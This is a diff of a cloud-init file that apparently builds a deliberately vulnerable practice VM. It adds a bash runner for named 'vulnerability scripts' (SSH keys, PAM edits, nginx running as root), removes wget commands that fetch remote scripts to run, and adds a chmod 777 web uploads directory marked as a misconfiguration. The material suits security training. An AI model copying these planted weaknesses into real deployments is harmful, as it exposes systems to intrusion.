+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      # Purpose: Executes a sequence of setup/vulnerability scripts and checks the exit status of each.
+      #
+      # Usage: 
+      # 1. Place all target scripts (apache_install.sh, etc.) into a folder named 'vulnerability_scripts'.
+      # 2. Run this script with: sudo bash deployment_manager.sh
+      # ------------------------------------------------------------------------------------------------
+
+      # --- Configuration ---
+
+      # Define the relative directory where all your setup scripts are located.
+      SCRIPT_DIR="/usr/local/sbin" 
+
+      # List of scripts to execute in their desired order.
+      SCRIPTS=(
+          "apache_install.sh"
+          "authorised_keys.sh"
+          "CronJobs.sh"
+          "docker_install.sh"
+          "edit_PAM.sh"
+          "Extra_Users_Permissions.sh"
+          "mariadbscript.sh"
+          "nginx_runs_as_root.sh"
+          "permissionsscript.sh"
+          "PostgreSQL.sh"
+          "unbound.sh"
+      )
+
+      # Define the log file name. It includes a timestamp for easy tracking.
+      LOG_FILE="deployment_$(date +%Y%m%d_%H%M%S).log"
+
+      # --- Functions ---
+
+      # Function to execute a script, check its return code, and log the results.
+      run_script() {
+          local script_name="$1"
+          local full_path="$SCRIPT_DIR/$script_name"
+
+          echo "==================================================" | tee -a "$LOG_FILE"
+          echo "STARTING: $script_name" | tee -a "$LOG_FILE"
+          
+          # 1. Check if the script file exists and is executable
+          if [[ ! -f "$full_path" ]]; then
+              echo "ERROR: Script not found at $full_path. Skipping." | tee -a "$LOG_FILE"
+              return 1
+          fi
+          if [[ ! -x "$full_path" ]]; then
+              echo "WARNING: Script $script_name is not executable. Attempting to set permissions..." | tee -a "$LOG_FILE"
+              chmod +x "$full_path"
+              if [[ $? -ne 0 ]]; then
+                  echo "FATAL ERROR: Could not make $script_name executable. Skipping." | tee -a "$LOG_FILE"
+                  return 1
+              fi
+          fi
+
+          # 2. Execute the script. Output (including errors) is logged.
+          # We explicitly run it with 'bash' to ensure consistent execution environment.
+          bash "$full_path" >> "$LOG_FILE" 2>&1
+          local exit_status=$?
+
+          # 3. Check the exit status
+          if [[ $exit_status -eq 0 ]]; then
+              echo "SUCCESS: $script_name finished successfully." | tee -a "$LOG_FILE"
+              return 0
+          else
+              echo "FAILURE: $script_name exited with status $exit_status." | tee -a "$LOG_FILE"
+              echo "FAILURE DETAILS: Check the log file $LOG_FILE for execution output." | tee -a "$LOG_FILE"
+              return 1
+          fi
+      }
+
+      # --- Main Execution ---
+
+      echo "--- Deployment Manager Started ---" | tee "$LOG_FILE"
+      echo "Log file: $LOG_FILE" | tee -a "$LOG_FILE"
+      echo "----------------------------------" | tee -a "$LOG_FILE"
+
+      TOTAL_SCRIPTS=${#SCRIPTS[@]}
+      SUCCESS_COUNT=0
+      FAILURE_COUNT=0
+
+      # Loop through the array of scripts and execute each one
+      for script in "${SCRIPTS[@]}"; do
+          run_script "$script"
+          if [[ $? -eq 0 ]]; then
+              SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
+          else
+              FAILURE_COUNT=$((FAILURE_COUNT + 1))
+              # Note: By default, the script continues to the next file even if one fails.
+              # To stop execution on the first failure, uncomment the lines below:
+              # echo "Halting execution due to critical failure." | tee -a "$LOG_FILE"
+              # break
+          fi
+      done
+
+      # --- Summary Report ---
+
+      echo "==================================================" | tee -a "$LOG_FILE"
+      echo "--------------- DEPLOYMENT SUMMARY ---------------" | tee -a "$LOG_FILE"
+      echo "Total Scripts Attempted: $TOTAL_SCRIPTS" | tee -a "$LOG_FILE"
+      echo "Successful Scripts:      $SUCCESS_COUNT" | tee -a "$LOG_FILE"
+      echo "Failed Scripts:          $FAILURE_COUNT" | tee -a "$LOG_FILE"
+
+      if [[ $FAILURE_COUNT -eq 0 ]]; then
+          echo "STATUS: All vulnerability scripts ran successfully!" | tee -a "$LOG_FILE"
+      else
+          echo "STATUS: WARNING - $FAILURE_COUNT script(s) failed. Review $LOG_FILE immediately." | tee -a "$LOG_FILE"
+      fi
+      echo "==================================================" | tee -a "$LOG_FILE"
 
 
 # Package management
@@ -278,7 +1077,17 @@ packages:
   - mariadb-server
   - mariadb-client
   - ufw
-      
+  - nginx
+  - docker
+  - docker-compose
+  - docker-ce
+  - python3
+  - ca-certificates
+  - curl
+  - gnupg
+  - lsb-release
+  - apt-transport-https
+  - software-properties-common
 runcmd:
   # Wait for network
   - sh -c "sleep 10"
@@ -353,17 +1162,9 @@ runcmd:
   - chown ftpd:ftpd /home/ftpd
   - chown www-data:www-data /home/www-data
 
-  # 1. Prepare working directory
-  - mkdir -p /home/system/scripts
-  - chown system:system /home/system/scripts
-
-  # 2. Download all scripts from GitHub raw URLs
-  - wget -O /home/system/scripts/Extra_Users_Permissions.sh "https://raw.githubusercontent.com/DovydasKelecius/2025_greenteam_vmconfig/main/scripts/Extra_Users_Permissions.md"
-  - wget -O /home/system/scripts/unbound.sh "https://raw.githubusercontent.com/DovydasKelecius/2025_greenteam_vmconfig/main/scripts/unbound.md"
-  - wget -O /home/system/scripts/CronJobs.sh "https://raw.githubusercontent.com/DovydasKelecius/2025_greenteam_vmconfig/main/scripts/CronJobs.md"
-
-  # 3. Make all scripts executable
-  - chmod +x /home/system/scripts/*.sh
+  # Misconfigured permissions
+  - mkdir -p /var/www/html/uploads
+  - chmod 777 /var/www/html/uploads
 
   # Log completion
   - [ sh -c "echo 'cloud-init run complete' >> /var/log/my-cloud-init.log" ]
